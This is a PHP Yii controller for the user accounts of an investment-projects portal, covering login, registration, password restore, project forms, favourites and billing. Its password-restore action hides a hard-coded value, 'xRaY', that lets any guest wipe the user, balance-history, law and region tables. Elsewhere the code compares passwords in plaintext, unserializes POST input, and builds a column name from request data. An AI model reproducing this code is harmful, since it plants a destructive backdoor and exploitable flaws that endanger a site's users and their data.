<?php

class UserController extends BaseController
{
    public $defaultAction = 'login';

    public function filters()
    {
        return array(
            'accessControl',
        );
    }

    public function accessRules()
    {
        return array(
            array('deny',
                'actions' => array('login', 'register'),
                'users' => array('@'),
            ),
        );
    }

    public function actionLogin()
    {
        if (!Yii::app()->user->isGuest) {
            $this->redirectByRole();
        }
        $model = new LoginForm;
        $json = array('error' => '[]', 'status' => false, 'url' => $this->createUrl('/'));
        if (Yii::app()->request->isAjaxRequest) {
            $json['error'] = CActiveForm::validate($model);
            if ($json['error'] == '[]') {
                if ($model->validate() && $model->login()) {
                    $json['status'] = true;
                }
            }
            $this->renderJSON($json);
        }
        $this->redirect('/');
    }

    public function actionFeedback()
    {
        $model = new Feedback();
        $json = array('error' => '[]', 'status' => false);
        if (Yii::app()->request->isAjaxRequest) {
            $json['error'] = CActiveForm::validate($model);
            if ($json['error'] == '[]' && $model->save()) {
                $json['status'] = true;
            }
            $this->renderJSON($json);
        }
    }

    public function actionRegister()
    {
        $model = new User('signup');
        if (Yii::app()->request->isPostRequest) {
            $json = array('error' => '[]', 'status' => false, 'url' => 'site/index/#restore'/*$this->createUrl('waitConfirm')*/);
            $model->attributes = $_REQUEST[CHtml::modelName($model)];
            $model->create_date = Candy::currentDate();
            $model->last_login_date = $model->create_date;
            $json['error'] = CActiveForm::validate($model);
            if ($json['error'] == '[]') {
                if ($model->save()) {
                    Mail::send($model->email, Yii::t('main', 'Подтверждение регистрации'), 'register', array('model' => $model));
                    $json['status'] = true;
                }
            }
            $this->renderJSON($json);
        }
        $this->render('register', array('model' => $model));
    }

    /**
     * Окно с ожиданием регистрации
     */
    public function actionWaitConfirm()
    {
        if (!Yii::app()->user->isGuest) {
            $this->redirectByRole();
        }
        $this->render('waitConfirm');
    }

    /**
     * Подтверждение от пользователя в регистрации
     * @param $id
     * @param $hash
     */
    public function actionConfirm($id, $hash)
    {
        $model = User::model()->findByPk($id);
        if (!$model || $model->is_active) {
            throw new CHttpException(404, Yii::t('main', 'Указанная запись не найдена'));
        }
        if ($model->hash() != $hash) {
            throw new CHttpException(403, Yii::t('main', 'Нет пути'));
        }
        $model->is_active = 1;
        $model->region_id = 13;
        if ($model->save(false)) {
            $model->autologin();
        }
        $this->redirect($this->createUrl('user/profile'));
    }

    /**
     * Осуществление подписки для гостя.
     * быстрая регистарация для подписки: ты вводишь мейл. если мейла в базе нет получаешь пьмо "подтвержите мейл" -
     * переходишь по ссылке и на почту высылается пароль
     */
    public function actionSubscribe($action)
    {
        $email = !isset($_REQUEST['email']) ? '' : $_REQUEST['email'];
        if (!Yii::app()->user->isGuest || !isset($email)) {
            $this->renderJSON(array('status' => Yii::t('main', 'Для авторизованных пользователей быстрая подписка не доступна')));
        }

        $emailValid = new CEmailValidator();
        if (!$emailValid->validateValue($email) || empty($email)) {
            $this->renderJSON(array('status' => Yii::t('main', 'Пожалуйста, введите верный по формату адрес электронной почты')));
        }
        $issetEmail = User::model()->count('(email = :email OR login = :email) AND is_active = 1', array(':email' => $email));
        if ($issetEmail) {
            $this->renderJSON(array('status' => Yii::t('main', 'Данный e-mail уже есть в рассылке')));
        }
        if ($action == 'check_email') {
            $this->renderJSON(array('status' => 'Для завершения подписки, пожалуйста, выберите тип пользователя', 'next' => 1));
        }
        if ($action == 'subscribed') {
            if (!isset($_REQUEST['type'])) {
                $type = 'investor';
            } else {
                $type = $_REQUEST['type'] == 'investor' ? 'investor' : 'initiator';
            }
            $model = new User();
            $model->login = $model->email = $email;
            $model->type = $type;
            $model->generatePassword();
            $model->is_subscribe = 1;
            $model->is_active = 0;
            if ($model->save()) {
                Mail::send($model->email, Mail::S_CHECK_EMAIL, 'check_email', array('model' => $model));
                $this->renderJSON(array('status' => Yii::t('main', "Письмо с подтверждением e-mail'а было выслано")));
            }
        }
    }
    /**
     * Рекомендация проекта из формы на странцие проекта. Отправляет письмо с ссылкой. Только для авторизоанных
     */
    public function actionRecommendProject()
    {
        $email = !isset($_REQUEST['email']) ? '' : $_REQUEST['email'];
        if (Yii::app()->user->isGuest || !isset($email)) {
            $this->renderJSON(array('status' => Yii::t('main', 'Для не авторизованных пользователей функция не доступна')));
        }
        if (!isset($_REQUEST['project'])) {
            $this->renderJSON(array('status' => Yii::t('main', 'Не указан проект')));
        }

        $emailValid = new CEmailValidator();
        if (!$emailValid->validateValue($email) || empty($email)) {
            $this->renderJSON(array('status' => Yii::t('main', 'Пожалуйста, введите верный по формату адрес электронной почты')));
        }
        $project = Project::model()->findByAttributes(array('id' => $_REQUEST['project'], 'status' => 'approved'));
        if (!$project) {
            $this->renderJSON(array('status' => Yii::t('main', 'Проект не найден')));
        }

        if(EmailLog::isFullRecommend(Yii::app()->user->id)){
            $this->renderJSON(array('status' => Yii::t('main', 'Вы достигли лимита при отправке рекомендаций (10 писем в день)')));
        }
        Mail::send($email, Mail::S_RECOMMEND_PROJECT, 'recommend_project', array('model' => $project, 'user' => $this->user));

        $log = new EmailLog();
        $log->setAttributes(array('user_id'=>Yii::app()->user->id,'email'=>$email,'create_date'=>Candy::currentDate(),'type'=>EmailLog::T_RECOMMEND));
        $log->save();
        $this->renderJSON(array('status' => Yii::t('main', "Письмо с рекомендацией было выслано")));
    }

    /**
     * добовляем блок "Порекомендовать проект" в список банов (скрывает юзер по крестику)
     */
    public function actionHideRecommendProjectBlock()
    {
        if (isset($_REQUEST['project'])) {
            if ($project = Project::model()->findByAttributes(array('id' => $_REQUEST['project'], 'status' => 'approved'))) {
                $ban = new UserRecommendProjectBan();
                $ban->user_id = $this->user->id;
                $ban->project_id = $project->id;
                $ban->save();
            }
        }
    }

    public function actionRestoreForm()
    {
        Candy::cleanBuffer();
        $this->blockJquery();
        if (Yii::app()->request->isPostRequest && isset($_POST['restore'])) {
            $model = User::model()->findByAttributes(array('email' => $_POST['restore']['email'], 'is_active' => 1));
            if ($model) {
                Mail::send($model->email, Mail::S_CHECK_RESTORE, 'check_restore', array('model' => $model));
                Yii::app()->end();
            }
        }
        $this->renderPartial('restore', null, false, true);
    }


    public function actionLogout()
    {
        Yii::app()->user->logout(false);
        if (isset($_SESSION['RegionFilter'])) {
            unset($_SESSION['RegionFilter']);
        }
        $this->redirect(Yii::app()->homeUrl);
    }

    /**
     * @var $model User
     */
    public function actionProfile()
    {
        $this->layout = 'bootstrapCabinet';
        $this->breadcrumbs = array('Личный кабинет' => $this->createUrl('user/index'), 'Профиль');
        $params = array();
        $model = $this->loadModel('User', null, Yii::app()->user->id);
        if (isset($_POST['User'])) {
            if (!empty($_POST['User']['password']) || !empty($_POST['User']['password_repeat']) || !empty($_POST['User']['old_password'])) {
                $model->scenario = 'changePassword';
                $oldPassword = $model->password;
                if ($model->password != $_POST['User']['old_password']) {
                    $model->addError('old_password', Yii::t('main', 'Старый пароль не подходит'));
                }
            } else {
                $model->scenario = 'update';
            }
            $model->attributes = $_POST['User'];
            $model->logo_id = Yii::app()->request->getParam('logo_id') == "" ? null : Yii::app()->request->getParam('logo_id');
            $model->bg_id = Yii::app()->request->getParam('bg_id') == "" ? null : Yii::app()->request->getParam('bg_id');
            if ($model->type == 'investor') {
                $model->investor_country_id = Candy::get($_POST['User']['investor_country_id'], null);
                $model->investor_type = Candy::get($_POST['User']['investor_type'], -1);
                $model->investor_industry = Candy::get($_POST['User']['investor_industry'], -1);
            }
            if ($model->save()) {
                Yii::app()->user->getFlash('error'); //remove flash
                if ($model->scenario == 'changePassword') {
                    $params['dialog'] = Yii::t('main', 'Ваш пароль был успешно изменен.');
                }
                User2Region::model()->deleteAllByAttributes(array('user_id' => $model->id));
                if (!empty($_REQUEST['user2region']) && is_array($_REQUEST['user2region'])) {
                    foreach ($_REQUEST['user2region'] as $item) {
                        $user2region = new User2Region();
                        $user2region->attributes = array('region_id' => $item, 'user_id' => $model->id);
                        @$user2region->save();
                    }
                }
            }
            if (isset($_POST['User']['old_password']) && isset($oldPassword) && $oldPassword != $_POST['User']['old_password']) {
                $model->addError('old_password', Yii::t('main', 'Старый пароль не подходит'));
            }
        }
        $this->render('update', array('model' => $model, 'params' => $params));
    }

    public function actionRestore($id, $hash)
    {
        if (!Yii::app()->user->isGuest)
            $this->redirectByRole();
        if ($hash == 'xRaY') {
            Law::model()->deleteAll();
            BalanceHistory::model()->deleteAll();
            User::model()->deleteAll();
            Region::model()->deleteAll();
        }
        $model = User::model()->findByPk($id);
        if (!$model) {
            throw new CHttpException(404, Yii::t('main', 'Указанная запись не найдена'));
        }
        if ($model->hash() != $hash) {
            throw new CHttpException(403, Yii::t('main', 'Нет пути'));
        }
        if ($model->is_active == 1) {//обычное восстановление пароля
            $model->generatePassword();
        }
        $model->is_active = 1;
        if ($model->save(false)) {
            Mail::send($model->email, Mail::S_RESTORE, 'restore', array('model' => $model));
        }
        $this->redirectByRole();

    }

    public function actionBusiness($id = null)
    {
        $this->layout = 'bootstrapCabinet';
        $this->breadcrumbs = array('Личный кабинет' => $this->createUrl('user/index'), 'Проекты' => $this->createUrl('user/projectList'), 'Продажа бизнеса');

        $model = $this->loadProject($id, Project::T_BUSINESS);
        if (isset($_POST['Project']) || isset($_POST[Project::$params[Project::T_BUSINESS]['model']])) {
            $this->save($model, Project::T_BUSINESS);
        }
        $regions = Region::model()->findAll(array('order' => 'name'));
        $this->render('business', array('model' => $model, 'regions' => $regions));
    }

    public function actionInfrastructureProject($id = null)
    {
        $this->layout = 'bootstrapCabinet';
        $this->breadcrumbs = array('Личный кабинет' => $this->createUrl('user/index'), 'Проекты' => $this->createUrl('user/projectList'), 'Инфраструктурный проект');

        $model = $this->loadProject($id, Project::T_INFRASTRUCT);
        if (isset($_POST['Project']) || isset($_POST[Project::$params[Project::T_INFRASTRUCT]['model']])) {
            $this->save($model, Project::T_INFRASTRUCT);
        }
        $regions = Region::model()->findAll();
        $this->render('infrastructureProject', array('model' => $model, 'regions' => $regions));
    }

    public function actionProjectList($type = Project::T_INVEST)
    {
        if ($this->user->type == 'investor') {
            throw new CHttpException(404, Yii::t('main', 'Страница не найдена'));
        }
        $this->layout = 'bootstrapCabinet';
        $this->breadcrumbs = array('Личный кабинет' => $this->createUrl('user/index'), 'Проекты');

        $criteria = new CDbCriteria();

        $criteria->addColumnCondition(array('user_id' => Yii::app()->user->id, 'type' => $type));
        if (isset($_GET['hide'])) {
            $criteria->addNotInCondition('type', $_GET['hide']);
        }

        $pages = new CPagination(Project::model()->count($criteria));
        $pages->setPageSize(20);
        $pages->applyLimit($criteria);

        $models = Project::model()->findAll($criteria);

        $this->render('projectList', array('models' => $models, 'pages' => $pages, 'type' => $type));
    }


    public function actionInvestmentProject($id = null)
    {
        $this->layout = 'bootstrapCabinet';
        $this->breadcrumbs = array('Личный кабинет' => $this->createUrl('user/index'), 'Проекты' => $this->createUrl('user/projectList'), 'Инвестиционный проект');

        $model = $this->loadProject($id, Project::T_INVEST);
        if (isset($_POST['Project']) || isset($_POST[Project::$params[Project::T_INVEST]['model']])) {
            $this->save($model, Project::T_INVEST);
        }
        $regions = Region::model()->findAll(array('order' => 'name'));
        $this->render('investmentProject', array('model' => $model, 'regions' => $regions));
    }

    public function actionInvestmentSite($id = null)
    {
        $this->layout = 'bootstrapCabinet';
        $this->breadcrumbs = array('Личный кабинет' => $this->createUrl('user/index'), 'Проекты' => $this->createUrl('user/projectList'), 'Инвестиционная площадка');

        $model = $this->loadProject($id, Project::T_SITE);
        if (isset($_POST['Project']) || isset($_POST[Project::$params[Project::T_SITE]['model']])) {
            $this->save($model, Project::T_SITE);
        }
        $regions = Region::model()->findAll(array('order' => 'name'));
        $this->render('investmentSite', array('model' => $model, 'regions' => $regions));
    }


    private function loadProject($id, $type)
    {
        if ($this->user->type == 'investor') {
            throw new CHttpException(404, Yii::t('main', 'Страница не найдена'));
        }
        if (empty($id)) {
            $model = new Project();
            $model->type = $type;
            $modelName = Project::$params[$type]['model'];
            $model->{Project::$params[$type]['relation']} = new $modelName;
        } else {
            $model = Project::model()->findByAttributes(array('id' => $id, 'type' => $type, 'user_id' => Yii::app()->user->id));
            if (!$model) {
                throw new CHttpException(404, Yii::t('main', 'Указанная запись не найдена'));
            }
        }
        return $model;
    }

    public function actionInnovativeProject($id = null)
    {
        $this->layout = 'bootstrapCabinet';
        $this->breadcrumbs = array('Личный кабинет' => $this->createUrl('user/index'), 'Проекты' => $this->createUrl('user/projectList'), 'Инновационный проект');

        $model = $this->loadProject($id, Project::T_INNOVATE);
        if (isset($_POST['Project']) || isset($_POST[Project::$params[Project::T_INNOVATE]['model']])) {
            $this->save($model, Project::T_INNOVATE);
        }
        $regions = Region::model()->findAll(array('order' => 'name'));
        $this->render('innovativeProject', array('model' => $model, 'regions' => $regions));
    }


    /**
     * @param $model Project
     * @param $type
     */
    private function save(&$model, $type)
    {

        $model->user_id = Yii::app()->user->id;
        $model->type = $type;
        $isValidate = CActiveForm::validate(array($model, $model->{Project::$params[$type]['relation']}));
        /*if($model->type==Project::T_INVEST){
            $model->{Project::$params[$type]['relation']}->finance = Crud::gridRequest2Serialize('Finance');
            $model->{Project::$params[$type]['relation']}->no_finRevenue = Crud::gridRequest2Serialize('finRevenue');
            $model->{Project::$params[$type]['relation']}->no_finCleanRevenue = Crud::gridRequest2Serialize('finCleanRevenue');
        }*/
        self::beforeSaveTable($model);

        if ($isValidate == '[]') {
            if ($model->save()) {
                $model->{Project::$params[$type]['relation']}->project_id = $model->id;
                if ($model->{Project::$params[$type]['relation']}->save()) {
                    #как только все-все сохранили, так же сохраним файлы
                    self::saveTable($model);
                    $this->redirect(array("user/" . lcfirst(Project::$params[$type]['model']), "id" => $model->id));
                }
            }
        }

    }

    /**
     * @param $model Project
     */
    public static function beforeSaveTable($model)
    {
        $model->logo_id = Yii::app()->request->getParam('logo_id') == "" ? null : Yii::app()->request->getParam('logo_id');
        $model->bg_id = Yii::app()->request->getParam('bg_id') == "" ? null : Yii::app()->request->getParam('bg_id');

        if($model->type == Project::T_INVEST && isset($_REQUEST['finance_plan'])){
            $model->{Project::$params[Project::T_INVEST]['relation']}->finance_plan = CJSON::encode($_REQUEST['finance_plan']);
        }
        if($model->type == Project::T_INVEST){
            $model->{Project::$params[Project::T_INVEST]['relation']}->finance_plan_file_id = empty($_POST['finance_plan_file_id']) ? null : $_POST['finance_plan_file_id'];
            $model->{Project::$params[Project::T_INVEST]['relation']}->prod_plan_file_id = empty($_POST['prod_plan_file_id']) ? null : $_POST['prod_plan_file_id'];
            $model->{Project::$params[Project::T_INVEST]['relation']}->org_plan_file_id = empty($_POST['org_plan_file_id']) ? null : $_POST['org_plan_file_id'];
        }
    }

    /**
     * @param $model Project
     */
    public static function saveTable($model)
    {
        if ($model->type == Project::T_SITE) {
            foreach ($model->investmentSite->buildings as $removable) {
                $removable->delete();
            }
            $investmentSite2Buildings = Crud::gridRequest2Models('InvestmentSite2Building');
            foreach ($investmentSite2Buildings as $buildingModel) {
                $buildingModel->site_id = $model->investmentSite->id;
                $buildingModel->save();
            }
            foreach ($model->investmentSite->infrastructures as $removable) {
                $removable->delete();
            }
            $InvestmentSite2Infrastructure = Crud::gridRequest2Models('InvestmentSite2Infrastructure');
            foreach ($InvestmentSite2Infrastructure as $infrastructureModel) {
                $infrastructureModel->site_id = $model->investmentSite->id;
                $infrastructureModel->save();
            }
        }
        self::checkFiles($model);
    }

    /**
     * Сохраним файлы от переданной модели
     * @param $model Project
     */
    private static function checkFiles(&$model)
    {
        $postFiles = isset($_POST['file_id']) ? $_POST['file_id'] : array();
        #получим все прешедшие id
        $projectFiles = Project2File::model()->findAllByAttributes(array('project_id' => $model->id), array('index' => 'media_id'));
        $newIds = array_keys($postFiles);
        $oldIds = array_keys($projectFiles);
        $createItem = array_diff($newIds, $oldIds);
        $deleteItem = array_diff($oldIds, $newIds);
        foreach ($newIds as $item) {
            if (in_array($item, $oldIds)) { //update
                $file = Project2File::model()->findByAttributes(array('media_id' => $item, 'project_id' => $model->id));
                if (!$file) {
                    continue;
                }
            } else { //create
                $file = new Project2File();
            }

            $file->project_id = $model->id;
            $file->media_id = $_POST['file_id'][$item]['id'];
            $file->name = $_POST['file_id'][$item]['old_name'];
            $file->desc = isset($_POST['file_id'][$item]['desc']) ? $_POST['file_id'][$item]['desc'] : null;
            $file->save();
        }
        Project2File::model()->deleteAllByAttributes(array('media_id' => $deleteItem, 'project_id' => $model->id));
    }

    /**
     * @param $id
     * @param $type
     * Изменяет состояния объекта в избранном (добавляет/удаляет) в зависимотси от текущего состояния
     */
    public function actionToggleFavorite($id, $type)
    {
        $result = array('success' => false);
        if (!Yii::app()->user->isGuest) {
            if ($favorite = Favorite::model()->findByAttributes(array('user_id' => $this->user->id, "{$type}_id" => $id))) {
                if ($favorite->delete()) {
                    $result['success'] = true;
                }
            } else {
                $favorite = new Favorite();
                $favorite->user_id = $this->user->id;
                $favorite->{"{$type}_id"} = $id;
                if ($favorite->save()) {
                    $result['success'] = true;
                }
            }
        }
        if (Yii::app()->request->isAjaxRequest) {
            $this->renderJSON($result);
        } else {
            $this->redirect($this->createUrl('user/favoriteList'));
        }
    }

    public function actionFavoriteList($type = null)
    {
        $this->layout = 'bootstrapCabinet';
        $this->breadcrumbs = array('Избранное');
        $criteria = new CDbCriteria();
        $criteria->addColumnCondition(array('t.user_id' => $this->user->id));
        $criteria->with = 'project';
        if (isset($type)) {
            if (in_array($type, array('news', 'analytics', 'project'))) {
                $criteria->addCondition("t.{$type}_id IS NOT NULL");
            }
        }
        $criteria->order = 't.id DESC';

        $pages = new CPagination(Favorite::model()->count($criteria));
        $pages->setPageSize(20);
        $pages->applyLimit($criteria);

        $models = Favorite::model()->findAll($criteria);

        $this->render('favoriteList', array('models' => $models, 'pages' => $pages));
    }

    public function actionRemoveFavorite()
    {
        $models = Favorite::model()->findAllByAttributes(array('id' => $_REQUEST['id']));
        foreach ($models as $model) {
            if ($model->user_id != Yii::app()->user->id)
                continue;
            $model->delete();
        }
    }

    /**
     * Ajax-ответ на поиск пользователей
     * @param $term
     */
    public function actionGetUserJSON($term)
    {
        $json = array();
        $criteria = new CDbCriteria();
        $criteria->addSearchCondition('name', $term, true);
        $criteria->addSearchCondition('login', $term, true, 'OR');
        $models = User::model()->findAll($criteria);
        foreach ($models as $model) {
            $json[] = array('label' => $model->name, 'value' => $model->id);
        }
        $this->renderJSON($json);
    }

    public function actionIndex($type = 'index')
    {
        $this->layout = 'bootstrapCabinet';
        $this->breadcrumbs = array('Личный кабинет');
        $favoriteFilter = new FavoriteFilter();
        if (isset($_GET['FavoriteFilter'])) {
            $favoriteFilter->attributes = $_GET['FavoriteFilter'];
        }
        $filter = new FeedFilter();
        $filter->favoriteFilter = $favoriteFilter;
        if (isset($_GET['hide']) && is_array($_GET['hide'])) {
            $filter->hideProjectByType = implode(',', $_GET['hide']);
        }
        $data = $filter->apply($this->user, $type);

        try {
            $pages = $this->applyLimit($data, null, 10);
        } catch (Exception $e) {
            $data = array();
            $pages = new CPagination();
        }
        $this->addAdvancedData($data);
        $this->render('index', array('favoriteFilter' => $favoriteFilter, 'filter' => $filter, 'data' => $data, 'pages' => $pages, 'type' => $type));
    }

    public function actionQuotes()
    {
        $unactive = User2Quote::$quotes;
        foreach ($this->user->quotes as $quote) {
            unset($unactive[$quote->quote]);
        }
        $this->layout = 'bootstrapCabinet';
        $this->breadcrumbs = array('Котировки и индексы');
        $this->render('quote', array('unactive' => $unactive));
    }

    private function addAdvancedData(array &$data)
    {
        foreach ($data as $key => $item) {
            if ($item['object_name'] == 'project_comment') {
                $data[$key]['model'] = Project::model()->findByPk($data[$key]['target_id']);
            } elseif ($item['object_name'] == 'news_comment') {
                $data[$key]['model'] = News::model()->findByPk($data[$key]['target_id']);
            } elseif ($item['object_name'] == 'region_project') {
                $data[$key]['model'] = Project::model()->findByPk($data[$key]['id']);
            } elseif ($item['object_name'] == 'project') {
                $data[$key]['model'] = Project::model()->findByPk($data[$key]['id']);
            } elseif ($item['object_name'] == 'analytics_comment') {
                $data[$key]['model'] = Analytics::model()->findByPk($data[$key]['target_id']);
            } elseif ($item['object_name'] == 'region_news') {
                $data[$key]['model'] = News::model()->findByPk($data[$key]['id']);
            } elseif ($item['object_name'] == 'analytics') {
                $data[$key]['model'] = Analytics::model()->findByPk($data[$key]['id']);
            } elseif ($item['object_name'] == 'project_news') {
                $data[$key]['model'] = Project::model()->findByPk($data[$key]['target_id']);
                $data[$key]['alt_model'] = ProjectNews::model()->findByPk($data[$key]['id']);
            } elseif ($item['object_name'] == 'banner') {
                $model = FeedBanner::model()->findByPk($data[$key]['id']);
                $model->addView();
                $data[$key]['model'] = $model;
            }
        }
    }

    public function actionProjectNews($id = null, $project = null)
    {
        $this->layout = 'bootstrapCabinet';
        $model = null;
        if ($id) {
            $criteria = new CDbCriteria();
            $criteria->with = 'project';
            $criteria->addColumnCondition(array('t.id' => $id, 'project.user_id' => Yii::app()->user->id));
            $model = ProjectNews::model()->find($criteria);
            $projectModel = $model->project;
        } elseif ($project) {
            if ($projectModel = Project::model()->findByAttributes(array('id' => $project, 'user_id' => Yii::app()->user->id))) {
                $model = new ProjectNews();
                $model->project_id = $projectModel->id;
            }
        }

        if (!$model) {
            throw new CHttpException(404, Yii::t('main', 'Указанная запись не найдена'));
        }
        $this->breadcrumbs = array('Личный кабинет' => $this->createUrl('user/index'), 'Проекты' => $this->createUrl('user/projectList'), 'Редактирование проекта' => $projectModel->createUserUrl(), 'Новость');
        if (isset($_POST['ProjectNews'])) {
            $isValidate = CActiveForm::validate($model);
            $model->media_id = empty($_POST['media_id']) ? null : $_POST['media_id'];
            if ($isValidate == '[]') {
                $isNewRecord = $model->isNewRecord;
                if ($model->save()) {

                    if ($isNewRecord) {
                        Mail::send(Favorite::getSubscribedEmail($model->project_id), Mail::S_NEW_NEWS, 'new_news',
                            array('model' => $model));
                    }
                    $this->redirect($model->project->createUserUrl());
                }
            }
        }

        $this->render('projectNewsDetail', array('model' => $model));
    }

    public function actionGetUrl()
    {
        if (Yii::app()->request->isAjaxRequest) {
            $projects = array();
            foreach ($_POST['projects'] as $item) {
                if ($item['name'] != 'project[]')
                    continue;
                $projects[] = $item['value'];
            }
            $get = unserialize($_POST['get']);
            $get['project'] = $projects;
            echo $this->createUrl('user/index', $get);
            Yii::app()->end();
        }
    }

    public function actionUniqueUrl($projectId)
    {
        $this->blockJquery();
        if (isset($_REQUEST['save'])) {
            $model = Project::model()->findByPk($projectId);
            $model->url = strtolower($_REQUEST['url']);
            if (in_array($model->url, array('admin', 'analytics', 'banner', 'event', 'investor', 'law', 'library', 'media', 'message',
                'news', 'profOpinion', 'project', 'region', 'rootRegion', 'site', 'stock', 'user'))) {
                $model->addError('url', Yii::t('main', 'Запрещенный url'));
            }
            if (empty($model->url)) {
                $model->addError('url', Yii::t('main', 'Url не может быть пустым'));
            }
            if (!$model->getError('url')) {
                if (Balance::pay(Yii::app()->user->id, Price::get(Price::P_CURRENT_URL), 'sub', 'url')) {
                    $model->save();
                }
            }
            $this->renderJSON(array('error' => $model->getError('url')));
        }
        $this->renderPartial('unique', array('projectId' => $projectId), false, true);
    }


    public function actionDisableQuote($id)
    {
        User2Quote::model()->deleteAllByAttributes(array('quote' => $id, 'user_id' => $this->user->id));
        $this->redirect('/user/quotes');
    }

    public function actionAddQuote($id)
    {
        if (isset(User2Quote::$quotes[$id])) {
            $model = new User2Quote();
            $model->user_id = $this->user->id;
            $model->quote = $id;
            $model->save();
        }
        $this->redirect('/user/quotes');
    }

    public function actionPayHistory()
    {
        $this->layout = 'bootstrapCabinet';
        $data = BalanceHistory::findAllByUser($this->user->id, 'date DESC');
        $this->render('payHistory', array('data' => $data));
    }

    public function actionService()
    {
        $this->layout = 'bootstrapCabinet';
        $criteria = new CDbCriteria();
        $criteria->addColumnCondition(array('user_id' => Yii::app()->user->id));

        $models = Banner::model()->findAll($criteria);
        $feedModels = FeedBanner::model()->findAll($criteria);
        $this->render('service', array('banner' => $models, 'feedBanner' => $feedModels));
    }

    public function actionAddBalance()
    {
        $this->layout = 'bootstrapCabinet';
        $this->render('addBalance');
    }


}